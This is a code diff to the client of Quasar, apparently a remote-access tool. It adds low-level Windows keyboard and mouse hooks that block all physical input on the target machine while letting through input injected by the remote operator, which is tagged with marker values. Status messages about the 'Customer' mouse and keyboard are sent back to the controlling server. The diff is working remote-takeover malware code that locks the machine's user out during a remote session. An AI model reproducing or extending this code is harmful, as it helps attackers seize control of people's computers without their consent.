@@ -37,6 +37,40 @@ namespace Quasar.Client.Messages
         const int WH_MOUSE_LL = 14;
         const int WM_MOUSEMOVE = 0x0200;
 
+        [StructLayout(LayoutKind.Sequential)]
+        private struct KBDLLHOOKSTRUCT
+        {
+            public uint vkCode;
+            public uint scanCode;
+            public uint flags;
+            public uint time;
+            public IntPtr dwExtraInfo;
+        }
+
+        private const uint LLKHF_INJECTED = 0x10;
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct MSLLHOOKSTRUCT
+        {
+            public POINT pt;
+            public uint mouseData;
+            public uint flags;
+            public uint time;
+            public IntPtr dwExtraInfo;
+        }
+
+        private const uint LLMHF_INJECTED = 0x01;
+
+        private const uint LLKHF_INPFLAG = 0x0C;
+        private const uint LLMHF_INPFLAG = 0x14;
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct POINT
+        {
+            public int x;
+            public int y;
+        }
+
         [DllImport("user32.dll")]
         static extern IntPtr SetWindowsHookEx(int idHook, keyboardHookProc callback, IntPtr hInstance, uint threadId);
 
@@ -135,7 +169,7 @@ namespace Quasar.Client.Messages
                         _mouseHookID = SetWindowsHookEx(WH_MOUSE_LL, MouseHookCallback, hInstance, 0);
                         if (_mouseHookID != IntPtr.Zero)
                         {
-                            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
+                            client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Disabled!" });
                         }
                     }
                     catch (Exception ex)
@@ -152,7 +186,7 @@ namespace Quasar.Client.Messages
                     {
                         UnhookWindowsHookEx(_mouseHookID);
                         _mouseHookID = IntPtr.Zero;
-                        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is enabled!" });
+                        client.Send(new NotifyMessageToServer { Message = "Customer Mouse is Enabled!" });
                     }
                 }));
             }
@@ -172,7 +206,6 @@ namespace Quasar.Client.Messages
                     catch (Exception ex)
                     {
                         client.Send(new NotifyMessageToServer { Message = "Exception From Keyboard Diable: " + ex.Message });
-
                     }
                 }));
             }
@@ -191,13 +224,27 @@ namespace Quasar.Client.Messages
         }   
         public IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0) return (IntPtr)1;  
-            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+            if (nCode >= 0)
+            {
+                KBDLLHOOKSTRUCT kbStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
+                if ((int)kbStruct.dwExtraInfo != 0x0AA)
+                {
+                    return (IntPtr)1; // Block only physical input for remote kernel-keyboard
+                }
+            }
+            return CallNextHookEx(_keyboardHookID, nCode, wParam, lParam);
         }
         public IntPtr MouseHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0) return (IntPtr)1;
-            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
+            if (nCode >= 0)
+            {
+                MSLLHOOKSTRUCT msStruct = Marshal.PtrToStructure<MSLLHOOKSTRUCT>(lParam);
+                if ((int)msStruct.dwExtraInfo != 0x0AB)
+                {
+                    return (IntPtr)1; // Block only physical input for remote kernel-mouse
+                }
+            }
+            return CallNextHookEx(_mouseHookID, nCode, wParam, lParam);
         }
     }
 }
